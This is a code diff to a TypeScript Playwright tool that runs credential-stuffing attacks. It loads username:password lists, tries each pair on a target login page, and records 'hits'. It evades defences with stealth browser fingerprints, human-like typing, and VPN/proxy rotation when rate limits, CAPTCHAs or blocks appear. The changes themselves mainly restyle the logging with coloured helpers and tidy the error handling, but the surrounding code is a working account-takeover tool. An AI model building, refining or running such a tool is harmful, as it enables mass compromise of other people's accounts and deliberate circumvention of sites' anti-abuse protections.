@@ -11,9 +11,30 @@
 import { chromium, Browser, Page } from 'playwright';
 import * as fs from 'fs';
 import * as path from 'path';
+import chalk from 'chalk';
 import { STEALTH_LAUNCH_ARGS, getStealthContextOptions, injectDeepStealth, simulateHuman, humanType, randDelay } from './stealth-utils';
 import { scanLogin, ScanResult } from './scanner';
 import { initProxies, rotate, smartRotate, recordSuccess as vpnSuccess, recordFail as vpnFail, printProxyStats, vpnDown, VpnSlot } from './proxy-rotator';
+
+// ─── Compact log helpers ──────────────────────────────────────────────────────
+const log = {
+  hit:    (msg: string) => console.log(chalk.green.bold(`  ✓ ${msg}`)),
+  miss:   (msg: string) => console.log(chalk.red(`  ✗ ${msg}`)),
+  warn:   (msg: string) => console.log(chalk.yellow(`  ⚠ ${msg}`)),
+  info:   (msg: string) => console.log(chalk.cyan(`  ${msg}`)),
+  dim:    (msg: string) => console.log(chalk.gray(`  ${msg}`)),
+  cred:   (i: number, total: number, email: string, vpn: string, ip: string | null) =>
+    console.log(`\n${chalk.white.bold(`[${i}/${total}]`)} ${chalk.cyan(email)} ${chalk.gray('|')} ${chalk.yellow(vpn)} ${chalk.gray(ip || '?')}`),
+  click:  (n: number, outcome: string, msg: string) => {
+    const color = outcome === 'success' ? chalk.green : outcome === 'wrong_credentials' ? chalk.red : chalk.yellow;
+    console.log(chalk.gray(`  click ${n}/3: `) + color(outcome) + chalk.gray(msg ? ` — ${msg.substring(0, 60)}` : ''));
+  },
+  summary: (attempted: number, succeeded: number, concurrency: number) => {
+    console.log(chalk.gray('\n' + '─'.repeat(50)));
+    console.log(chalk.white.bold(`  Done: ${attempted} tested | `) + chalk.green.bold(`${succeeded} hit(s)`) + chalk.gray(` | concurrency: ${concurrency}`));
+    console.log(chalk.gray('─'.repeat(50)));
+  },
+};
 
 
 // ─── Types ────────────────────────────────────────────────────────────────────
@@ -177,7 +198,7 @@ async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedO
     urlChanged = postSubmitUrl.toLowerCase() !== originalUrl.toLowerCase();
   }
 
-  console.log(`[detect] url: ${postSubmitUrl} (changed=${urlChanged})`);
+  // Debug URL change detection (kept minimal)
 
   // 1. CAPTCHA Detection
   // Only trigger if a CAPTCHA iframe or known element is actually visible and takes up real estate,
@@ -235,7 +256,7 @@ async function detectOutcome(page: Page, originalUrl: string): Promise<DetailedO
       // Only count if the text actually contains error-related keywords
       const hasErrorWord = ERROR_WORDS.some(w => elText.includes(w));
       if (hasErrorWord) {
-        console.log(`[detect] Error selector: ${selector} | text: "${elText.substring(0, 120)}"`);
+        // Error selector matched
         hasVisibleError = true;
         visibleErrorDetail = `visible error [${selector}]: "${elText.substring(0, 80)}"`;
         break;
@@ -310,7 +331,6 @@ async function attemptLogin(
 
   // Capture actual URL after redirect (not the Google redirect URL)
   const actualLoginUrl = page.url();
-  console.log(`[login] actual URL after load: ${actualLoginUrl}`);
 
   await simulateHuman(page);
 
@@ -318,13 +338,13 @@ async function attemptLogin(
   try {
     const loginNavBtn = 'body > div.ol-pos_sticky.ol-top_0.ol-z_docked > div > header > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__root.ol-headerRight__root--variant_center.ol-headerRight__root--size_lg.ol-headerRight__right.ol-headerRight__right--variant_center.ol-headerRight__right--size_lg > div.ol-headerRight__loggedOut.ol-headerRight__loggedOut--variant_center.ol-headerRight__loggedOut--size_lg > div > a';
     if (await page.isVisible(loginNavBtn)) {
-      console.log(`[login] Clicking specific login nav button`);
+      // Click login nav button
       await page.click(loginNavBtn, { timeout: 5000 });
       await page.waitForTimeout(1000);
     } else {
       const genericBtn = await page.$('a:has-text("Login"), button:has-text("Login"), a:has-text("Log In"), button:has-text("Log In")');
       if (genericBtn && await genericBtn.isVisible()) {
-        console.log(`[login] Clicking generic Login button`);
+        // Click generic Login button
         await genericBtn.click();
         await page.waitForTimeout(1000);
       }
@@ -335,11 +355,9 @@ async function attemptLogin(
   const userVisible = await page.locator(usernameCss).first().isVisible().catch(() => false);
   const passVisible = await page.locator(passwordCss).first().isVisible().catch(() => false);
   const submitVisible = await page.locator(submitCss).first().isVisible().catch(() => false);
-  console.log(`[login] fields visible: user=${userVisible} pass=${passVisible} submit=${submitVisible}`);
 
   if (!userVisible || !passVisible) {
-    console.warn(`[login] Form fields not visible — page may not have loaded correctly`);
-    // Try screenshot for debug
+    log.warn('Form fields not visible');
     await page.screenshot({ path: `./debug_form_${Date.now()}.png`, fullPage: true }).catch(() => {});
   }
 
@@ -365,20 +383,20 @@ async function attemptLogin(
     }
 
     if (!await page.locator(submitCss).first().isVisible().catch(() => false)) {
-      console.warn(`[login] Submit button ${submitCss} not visible — trying fallback selectors`);
+      // Submit button not visible — trying fallback selectors
       // Try common submit button selectors
       const fallbacks = ['button[type="submit"]', 'input[type="submit"]', 'button:has-text("Login")', 'button:has-text("Log In")', 'button:has-text("Sign In")'];
       let clicked = false;
       for (const fb of fallbacks) {
         if (await page.locator(fb).first().isVisible().catch(() => false)) {
-          console.log(`[login] Using fallback submit: ${fb}`);
+          // Using fallback submit
           await page.click(fb);
           clicked = true;
           break;
         }
       }
       if (!clicked) {
-        console.error(`[login] No submit button found — pressing Enter as last resort`);
+        log.warn('No submit button — pressing Enter');
         await page.keyboard.press('Enter');
       }
     } else {
@@ -386,8 +404,7 @@ async function attemptLogin(
     }
     lastOutcome = await detectOutcome(page, actualLoginUrl);
 
-    // Log each click result individually
-    console.log(`[auto]   click ${attemptNum}/3: ${lastOutcome.outcome} — ${lastOutcome.message || 'no message'}`);
+    log.click(attemptNum, lastOutcome.outcome, lastOutcome.message || '');
 
     // Stop on success or 2FA prompt
     if (lastOutcome.outcome === 'success' || lastOutcome.outcome === '2fa_required') {
@@ -396,14 +413,14 @@ async function attemptLogin(
 
     // If first click returns account_locked with "account has been" — skip to next cred immediately
     if (attemptNum === 1 && lastOutcome.outcome === 'account_locked' && (lastOutcome.message || '').includes('account has been')) {
-      console.log(`[auto]   account permanently locked — skipping to next cred`);
+      log.warn('account permanently locked — skipping');
       errorStrs.push(lastOutcome.message || 'account has been locked');
       break;
     }
 
     // Visible error selector = likely detection/block — break immediately so outer loop can rotate VPN
     if ((lastOutcome.message || '').includes('visible error selector triggered')) {
-      console.log(`[auto]   visible error selector — will rotate VPN and retry`);
+      log.warn('visible error — will rotate VPN');
       errorStrs.push(lastOutcome.message || 'visible error selector triggered');
       break;
     }
@@ -490,7 +507,7 @@ export async function runLoginAuto(
     console.error(`[auto] No creds found in ${credsFile}. Add lines in format: username:password`);
     return;
   }
-  console.log(`[auto] Loaded ${creds.length} credential(s) from ${credsFile}`);
+  console.log(chalk.cyan(`  ${creds.length} creds loaded`));
 
   // ── Get selectors from scan_results.json (most recent with selectors) ───────
   let selectors: ScanResult['selectors'] = [];
@@ -504,9 +521,9 @@ export async function runLoginAuto(
 
   if (withSelectors.length > 0) {
     selectors = withSelectors[withSelectors.length - 1].selectors;
-    console.log(`[auto] Reusing ${selectors.length} selector(s) from previous scan`);
+    log.dim(`${selectors.length} cached selectors`);
   } else {
-    console.log(`[auto] No cached selectors for ${targetUrl} — running scanner first...`);
+    log.info('Scanning login page...');
     const scanResult = await scanLogin(targetUrl);
     if (scanResult.selectors.length === 0) {
       console.error('[auto] Scanner found no selectors. Cannot proceed with login automation.');
@@ -514,7 +531,7 @@ export async function runLoginAuto(
       return;
     }
     selectors = scanResult.selectors;
-    console.log(`[auto] Scanner found ${selectors.length} selector(s)`);
+    log.dim(`Scanner found ${selectors.length} selector(s)`);
   }
 
   // ── Precompute selectors once (same for every cred) ──────────────────────────
@@ -531,8 +548,8 @@ export async function runLoginAuto(
     passwordCss: buildSel(passwordEl, 'input[type="password"]'),
     submitCss:   buildSel(submitEl, '#loginSubmit'),
   };
-  console.log(`[auto] Precomputed selectors: user=${precomputedSelectors.usernameCss} pass=${precomputedSelectors.passwordCss} submit=${precomputedSelectors.submitCss}`);
-  console.log(`[auto] Concurrency: ${concurrency} worker(s)`);
+  console.log(chalk.gray(`  selectors: user=${precomputedSelectors.usernameCss} pass=${precomputedSelectors.passwordCss} submit=${precomputedSelectors.submitCss}`));
+  console.log(chalk.cyan.bold(`\n  Starting — ${creds.length} creds × ${concurrency} workers\n`));
 
   // ── Stat tracking ────────────────────────────────────────────────────────────
   let attempted = 0;
@@ -613,7 +630,7 @@ export async function runLoginAuto(
     try {
       activeVpn = smartRotate();
       if (!activeVpn) {
-        console.warn('[auto] VPN rotation failed — continuing with current connection.');
+        log.warn('VPN rotation failed');
       }
     } finally {
       releaseMutex();
@@ -625,7 +642,7 @@ export async function runLoginAuto(
 
   async function handleRateLimit(): Promise<void> {
     if (rateLimitPausePromise) return rateLimitPausePromise; // already pausing
-    console.warn(`\n[auto] Rate limit detected — pausing all workers, rotating VPN...`);
+    log.warn('Rate limit — pausing all workers, rotating VPN...');
     rateLimitPausePromise = (async () => {
       await acquireMutex();
       try {
@@ -638,7 +655,7 @@ export async function runLoginAuto(
           ignoreHTTPSErrors: true as any,
         } as any);
         browserCredsProcessed = 0;
-        console.log(`[auto] Rate limit recovery: new VPN=${activeVpn?.name ?? 'none'}, fresh browser`);
+        log.info(`Recovered: VPN=${activeVpn?.name ?? 'none'}`);
       } finally {
         releaseMutex();
         rateLimitPausePromise = null;
@@ -660,7 +677,8 @@ export async function runLoginAuto(
     if (rateLimitPausePromise) await rateLimitPausePromise;
 
     let vpnName = activeVpn?.name ?? 'none';
-    console.log(`\n[auto] [${credIndex + 1}/${totalCreds}] ${username} | vpn: ${vpnName}`);
+    const vpnIp = activeVpn?.currentIp || null;
+    log.cred(credIndex + 1, totalCreds, username, vpnName, vpnIp);
 
     let attempt: LoginAttempt = {
       url:        targetUrl,
@@ -678,32 +696,34 @@ export async function runLoginAuto(
       if (stopEarly) break;
       if (rateLimitPausePromise) await rateLimitPausePromise;
 
-      await ensureBrowser();
-
-      const ctxOpts = getStealthContextOptions();
-      const context = await browser.newContext({
-        ...ctxOpts,
-        ignoreHTTPSErrors: true as any,
-      } as any);
-
-      const page = await context.newPage();
-      const fpSeed = `login-${username}-${Date.now()}-r${retryNum}`;
-      await injectDeepStealth(page, fpSeed, {
-        navPlatform: ctxOpts._navPlatform,
-        uaDataPlatform: ctxOpts._uaDataPlatform,
-        chromeVersion: ctxOpts._chromeVersion,
-      });
-      if (retryNum > 0) {
-        console.log(`[auto]   new fingerprint: UA=${(ctxOpts.userAgent || '').slice(-30)} viewport=${ctxOpts.viewport?.width}x${ctxOpts.viewport?.height}`);
-      }
-
       const t0 = Date.now();
-      attempt.timestamp = new Date().toISOString();
-      attempt.tunnel = activeVpn?.name ?? 'none';
-
       let shouldRetry = false;
+      let context: Awaited<ReturnType<Browser['newContext']>> | null = null;
+      let page: Page | null = null;
 
       try {
+        await ensureBrowser();
+
+        const ctxOpts = getStealthContextOptions();
+        context = await browser.newContext({
+          ...ctxOpts,
+          ignoreHTTPSErrors: true as any,
+        } as any);
+
+        page = await context.newPage();
+        const fpSeed = `login-${username}-${Date.now()}-r${retryNum}`;
+        await injectDeepStealth(page, fpSeed, {
+          navPlatform: ctxOpts._navPlatform,
+          uaDataPlatform: ctxOpts._uaDataPlatform,
+          chromeVersion: ctxOpts._chromeVersion,
+        });
+        if (retryNum > 0) {
+          log.dim(`retry fingerprint: ${ctxOpts.viewport?.width}x${ctxOpts.viewport?.height}`);
+        }
+
+        attempt.timestamp = new Date().toISOString();
+        attempt.tunnel = activeVpn?.name ?? 'none';
+
         const outcome = await attemptLogin(page, targetUrl, selectors, username, password, precomputedSelectors);
 
         attempt.success       = outcome.outcome === 'success' || outcome.outcome === '2fa_required';
@@ -716,7 +736,7 @@ export async function runLoginAuto(
         await page.screenshot({ path: `./attempt_${outcome.outcome}_${username.replace(/[^a-z0-9]/gi, '_')}_${Date.now()}.png`, fullPage: true }).catch(() => {});
 
         if (attempt.success) {
-          console.log(`[auto] ✓ HIT: ${username}:${password} (${attempt.reason})`);
+          log.hit(`${username}:${password}`);
           if (activeVpn) vpnSuccess(activeVpn);
           succeeded++;
           hits.push(attempt);
@@ -724,57 +744,53 @@ export async function runLoginAuto(
             stopEarly = true;
           }
         } else if (outcome.outcome === 'rate_limited') {
-          console.log(`[auto] ✗ rate limited: ${username} — pausing all workers`);
+          log.warn(`rate limited: ${username}`);
           await handleRateLimit();
           shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
         } else if (outcome.outcome === 'account_locked' && (outcome.message || '').includes('account has been')) {
-          console.log(`[auto] ✗ account permanently locked: ${username} — moving on`);
+          log.miss(`locked: ${username}`);
         } else if (retryNum < MAX_VISIBLE_ERROR_RETRIES) {
           const isVisibleError = (outcome.message || '').includes('visible error selector triggered');
-          console.warn(`[auto] ✗ ${outcome.outcome} on ${vpnName} — rotating VPN + fingerprint, retrying ${username} (retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES})${isVisibleError ? ' [IMMEDIATE]' : ''}...`);
+          log.miss(`${outcome.outcome} — retry ${retryNum + 1}/${MAX_VISIBLE_ERROR_RETRIES}`);
           if (activeVpn) vpnFail(activeVpn);
           await safeRotateVpn();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = true;
           (attempt as any)._immediateRetry = isVisibleError;
         } else {
-          console.log(`[auto] ✗ miss: ${username} (${attempt.reason}) — exhausted all retries`);
+          log.miss(`${username}: ${attempt.reason}`);
         }
 
       } catch (err: any) {
-        console.error(`[auto] error on ${username}: ${err.message?.split('\n')[0]}`);
         attempt.reason     = err.message?.split('\n')[0] ?? 'unknown_error';
         attempt.durationMs = Date.now() - t0;
 
-        // Browser closed by another worker (rate-limit recovery / recycle) — just retry with new browser
+        // Browser closed by another worker (rate-limit recovery / recycle) — just retry
         if (isBrowserClosedError(err.message ?? '')) {
-          console.log(`[auto] Browser was recycled by another worker — will retry ${username}`);
+          log.dim(`browser recycled — retrying ${username}`);
           shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
         } else if (isBlockError(err.message ?? '')) {
           if (activeVpn) vpnFail(activeVpn);
-          console.warn(`[auto] Block/connection error on ${vpnName} — rotating VPN now.`);
+          log.warn(`connection error on ${vpnName} — rotating`);
           await safeRotateVpn();
           vpnName = activeVpn?.name ?? 'none';
           shouldRetry = retryNum < MAX_VISIBLE_ERROR_RETRIES;
-          await recycleBrowser().catch(e => {
-            console.error(`[auto] recycleBrowser failed: ${e.message?.split('\n')[0]}`);
-            shouldRetry = false;
-          });
+          await recycleBrowser().catch(() => { shouldRetry = false; });
         } else {
+          log.miss(`error: ${(err.message ?? '').split('\n')[0].substring(0, 60)}`);
           if (activeVpn) vpnFail(activeVpn);
         }
+      } finally {
+        await context?.close().catch(() => {});
+        browserCredsProcessed++;
       }
-
-      await context.close().catch(() => {});
-      browserCredsProcessed++;
 
       if (!shouldRetry) break;
 
       if (!(attempt as any)._immediateRetry) {
-        console.log(`[auto] Waiting 1s before retry...`);
         await new Promise(r => setTimeout(r, 1000));
       }
-      console.log(`[auto] Retrying with new VPN: ${vpnName} + fresh fingerprint`);
+      log.dim(`retry → ${vpnName}`);
     }
 
     appendResult(attempt);
@@ -801,7 +817,7 @@ export async function runLoginAuto(
         flushCredRemovals();
       }
     } catch(e) {
-      console.error(`[auto] Failed to sort/remove credential:`, e);
+      log.warn(`sort/remove error: ${(e as any)?.message?.substring(0, 40)}`);
     }
 
     attempted++;
@@ -818,13 +834,13 @@ export async function runLoginAuto(
 
       // Rotate VPN based on rotateEvery setting
       if (rotateEvery > 0 && totalDispatched > 0 && totalDispatched % rotateEvery === 0) {
-        console.log(`\n[auto] Rotating VPN (every ${rotateEvery} attempt${rotateEvery > 1 ? 's' : ''})...`);
+        log.info(`Rotating VPN (every ${rotateEvery})...`);
         await safeRotateVpn();
       }
 
       // Recycle browser periodically
       if (browserCredsProcessed >= BROWSER_RECYCLE_INTERVAL) {
-        console.log(`[auto] Recycling browser (${BROWSER_RECYCLE_INTERVAL} creds processed)...`);
+        log.dim(`Recycling browser (${BROWSER_RECYCLE_INTERVAL} creds)`);
         await recycleBrowser();
       }
 
@@ -842,7 +858,7 @@ export async function runLoginAuto(
       // Inter-batch delay
       if (batchEnd < creds.length && !stopEarly) {
         const delay = randDelay(delayBetweenMs[0], delayBetweenMs[1]);
-        console.log(`[auto] Batch done. Waiting ${(delay / 1000).toFixed(1)}s before next batch...`);
+        log.dim(`batch done, ${(delay / 1000).toFixed(1)}s pause`);
         await new Promise(r => setTimeout(r, delay));
       }
     }
@@ -854,22 +870,19 @@ export async function runLoginAuto(
   }
 
   // ── Summary ─────────────────────────────────────────────────────────────────
-  console.log(`\n${'─'.repeat(54)}`);
-  console.log(`[auto] Done. ${attempted} attempted | ${succeeded} hit(s) | concurrency: ${concurrency}`);
+  log.summary(attempted, succeeded, concurrency);
   if (hits.length > 0) {
-    console.log('[auto] Successful credentials:');
     for (const h of hits) {
-      console.log(`  ✓  ${h.username}  (${h.reason}, ${h.durationMs}ms)`);
+      log.hit(`${h.username} (${h.durationMs}ms)`);
     }
   }
-  console.log(`[auto] Results saved to ${LOGIN_LOG}`);
+  log.dim(`Results: ${LOGIN_LOG}`);
   printProxyStats();
-  console.log(`${'─'.repeat(54)}\n`);
 }
 
 // ── Graceful shutdown — flush buffers and tear down VPN on exit ────────────────
 function cleanup() {
-  console.log('\n[auto] Shutting down — flushing buffers and disconnecting VPN...');
+  console.log(chalk.yellow('\n  Shutting down...'));
   flushResults();
   flushCredRemovals();
   vpnDown();
